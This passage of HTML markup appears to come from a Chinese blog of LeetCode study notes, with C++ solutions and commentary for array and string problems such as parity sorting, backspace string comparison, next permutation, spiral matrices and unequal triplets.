class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[left]%<span class="number">2</span>==<span class="number">1</span> &amp;&amp; nums[right]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[left],nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[left]%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                left++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[right]%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">                right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="922-按奇偶排序数组-II——奇数放在奇数位，偶数放在偶数位"><a href="#922-按奇偶排序数组-II——奇数放在奇数位，偶数放在偶数位" class="headerlink" title="922 按奇偶排序数组 II——奇数放在奇数位，偶数放在偶数位"></a>922 按奇偶排序数组 II——奇数放在奇数位，偶数放在偶数位</h3><p>给定一个非负整数数组 nums，nums 中一半整数是 奇数 ，一半整数是 偶数 。<br>对数组进行排序，以便当 nums[i] 为奇数时，i 也是 奇数 ；当 nums[i] 为偶数时， i 也是 偶数 。<br>你可以返回 任何满足上述条件的数组作为答案 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针 i偶数位   j奇数位</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParityII</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n &amp;&amp; j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;n &amp;&amp; nums[i]%<span class="number">2</span>==<span class="number">0</span>)<span class="comment">//循环寻找 偶数位上 是奇数</span></span><br><span class="line">                i+=<span class="number">2</span>;<span class="comment">//是偶数正常，则跳过</span></span><br><span class="line">            <span class="keyword">while</span>(j&lt;n &amp;&amp; nums[j]%<span class="number">2</span>==<span class="number">1</span>)<span class="comment">//循环寻找 奇数位上 是偶数</span></span><br><span class="line">                j+=<span class="number">2</span>;<span class="comment">//是奇数正常，则跳过</span></span><br><span class="line">            <span class="keyword">if</span>(i&lt;n &amp;&amp; j&lt;n)</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="844-比较含退格的字符串"><a href="#844-比较含退格的字符串" class="headerlink" title="844 比较含退格的字符串"></a>844 比较含退格的字符串</h3><p>输入：s = “ab#c”, t = “ad#c”<br>输出：true<br>解释：s 和 t 都会变成 “ac”。</p><p><strong>几个知识点：</strong></p><ul><li>s.substr(0,s1)==t.substr(0,t1);子串截取</li><li>字符串里也有 push_back()在字符串 <code>末尾</code> 插入字符</li><li>pop_back() 删除字符串 <code>末尾</code> 的字符<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//str.substr(0,j);截取</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">after_back</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                str[j++]=str[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;<span class="number">0</span>)&#123;<span class="comment">//问题出现在这里，要考虑到开头是#的情况，</span></span><br><span class="line">                    j--;<span class="comment">//遇到#,j向后退一下</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//string res;</span></span><br><span class="line">        <span class="keyword">return</span> str.<span class="built_in">substr</span>(<span class="number">0</span>,j);<span class="comment">//返回字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        string s1 = <span class="built_in">after_back</span>(s);</span><br><span class="line">        string t1 = <span class="built_in">after_back</span>(t);</span><br><span class="line">        <span class="keyword">return</span> s1==t1;</span><br><span class="line">    <span class="comment">//或者返回长度，然后return s.substr(0,s1)==t.substr(0,t1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    官解</span></span><br><span class="line"><span class="comment">    push_back()     pop_back()</span></span><br><span class="line"><span class="comment">    字符串中的函数，可以理解为栈</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">after_back</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        string res;<span class="comment">//新定义了一个 string</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(str[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!res.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="comment">//删除字符串的最后一个字符</span></span><br><span class="line">                res.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">after_back</span>(s)==<span class="built_in">after_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="977 有序数组的平方"></a>977 有序数组的平方</h3>给你一个按【非递减顺序】排序的整数数组 nums，返回 每个数字的平方 组成的新数组，要求也按 非递减顺序 排序。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    nums[j++]=nums[i]*nums[i];</span></span><br><span class="line"><span class="comment">    或者ans.push_back(num * num);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//在原数组上改动</span></span><br><span class="line">            nums[j++]=nums[i]*nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">    重点在于 数组本身有序，则平方之后的最大值只可能是在 最左边 或者是 最右边</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> k = A.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//倒序 插入</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(A.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>, j=A.<span class="built_in">size</span>()<span class="number">-1</span>; i &lt;= j;) &#123; <span class="comment">//注意这里要i &lt;= j，因为最后要处理两个元素</span></span><br><span class="line">            <span class="keyword">if</span> (A[i]*A[i] &lt; A[j]*A[j])  &#123;</span><br><span class="line">                result[k--] = A[j]*A[j];</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result[k--] = A[i]*A[i];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title="31 下一个排列"></a>31 下一个排列</h3>【下一个排列】的定义是：给定数字序列的字典序中下一个更大的排列。如果不存在下一个更大的排列，则将数字重新排列成最小的排列（即升序排列）。<br><img src="https://img-blog.csdnimg.cn/01378ba8c5164db29609ef560d28871c.png"></li></ul><p><strong>思路：</strong><br><img src="https://img-blog.csdnimg.cn/39a23aa26e8b4a62aa0e90ba687c78c9.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    O(N)至多只需要扫描两次序列，以及进行一次反转操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=nums.<span class="built_in">size</span>()<span class="number">-2</span>;</span><br><span class="line">        <span class="comment">//从后向前找，第一个 下一个数&gt;前一个数 的情况</span></span><br><span class="line">        <span class="comment">//i指向 前面的 小数</span></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[i+<span class="number">1</span>])&#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> j = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            <span class="comment">//从后向前找（尽可能靠右），尽可能小的 大数</span></span><br><span class="line">            <span class="comment">//j指向后面的大数</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[j])&#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换 前面的小数 与 后面的大数</span></span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将i位置开始 后面 序列进行升序排列</span></span><br><span class="line">        <span class="built_in">reverse</span>(nums.<span class="built_in">begin</span>()+i+<span class="number">1</span>,nums.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="58-最后一个单词的长度"><a href="#58-最后一个单词的长度" class="headerlink" title="58 最后一个单词的长度"></a>58 最后一个单词的长度</h3><p>给你一个字符串 s，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 最后一个 单词的长度。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    输入：s = &quot;Hello World&quot;</span></span><br><span class="line"><span class="comment">    输出：5 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; s[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="54-螺旋矩阵——模拟边界-顺时针打印"><a href="#54-螺旋矩阵——模拟边界-顺时针打印" class="headerlink" title="54 螺旋矩阵——模拟边界-顺时针打印"></a>54 螺旋矩阵——模拟边界-顺时针打印</h3><p><img src="https://img-blog.csdnimg.cn/3573df4312cd417090c1e3f69b14aa42.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(matrix.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> down = matrix.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//行：二维数组包含的一维数组个数</span></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = matrix[<span class="number">0</span>].<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//列：每个一维数组包含元素个数</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;i++)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[up][i]);<span class="comment">//从左向右移动，行不变</span></span><br><span class="line">            <span class="keyword">if</span>(++up&gt;down)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义上边界，即 下一行</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=up;i&lt;=down;i++)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[i][right]);<span class="comment">//从上向下移动，列不变</span></span><br><span class="line">            <span class="keyword">if</span>(--right&lt;left)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义右边界，即 向左一列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=right;i&gt;=left;i--)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[down][i]);<span class="comment">//从右向左移动，行不变</span></span><br><span class="line">            <span class="keyword">if</span>(--down&lt;up)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义下边界，即 向上一行</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=down;i&gt;=up;i--)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(matrix[i][left]);<span class="comment">//从下向上移动，列不变</span></span><br><span class="line">            <span class="keyword">if</span>(++left&gt;right)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//重新定义左边界，即 向右一列</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="59-螺旋矩阵-II——生成n-2矩阵"><a href="#59-螺旋矩阵-II——生成n-2矩阵" class="headerlink" title="59 螺旋矩阵 II——生成n^2矩阵"></a>59 螺旋矩阵 II——生成n^2矩阵</h3><p><img src="https://img-blog.csdnimg.cn/d981e11c87b84db6a23e4d8d6f5ab5a8.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//n行，每行是一个 vector&lt;int&gt;(n)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">generateMatrix</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> up=<span class="number">0</span>,left=<span class="number">0</span>,down=n<span class="number">-1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">ans</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>,nums = n*n;</span><br><span class="line">        <span class="keyword">while</span>(count&lt;=nums)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;i++)</span><br><span class="line">                ans[up][i] = count++;</span><br><span class="line">            up++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=up;i&lt;=down;i++)</span><br><span class="line">                ans[i][right] = count++;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=right;i&gt;=left;i--)</span><br><span class="line">                ans[down][i] = count++;</span><br><span class="line">            down--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=down;i&gt;=up;i--)</span><br><span class="line">                ans[i][left] = count++;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2475-数组中不等三元组的数目"><a href="#2475-数组中不等三元组的数目" class="headerlink" title="2475 数组中不等三元组的数目"></a>2475 数组中不等三元组的数目</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力枚举</span></span><br><span class="line"><span class="comment">    O(n^3)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=j+<span class="number">1</span>;k&lt;len;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(nums[i]!=nums[j] &amp;&amp; nums[j]!=nums[k] &amp;&amp; nums[i]!=nums[k])</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  res += i*(j-i)*(len-j);</span></span><br><span class="line"><span class="comment">    排序后 相同元素一定相邻</span></span><br><span class="line"><span class="comment">    由题意可知，数组元素的相对顺序不影响结果，因此我们可以将数组 nums 从小到大进行排序。</span></span><br><span class="line"><span class="comment">    当我们以某一堆相同的数 [i,j) 作为三元组的中间元素时，这堆相同的元素的左边元素数目为 i，右边元素数目为 n−j，那么符合条件的三元组数目为：i×(j−i)×(n−j)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//先排序</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>,len=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;len;i=j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;len &amp;&amp; nums[j] == nums[i])</span><br><span class="line">                j++;</span><br><span class="line">            res += i*(j-i)*(len-j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 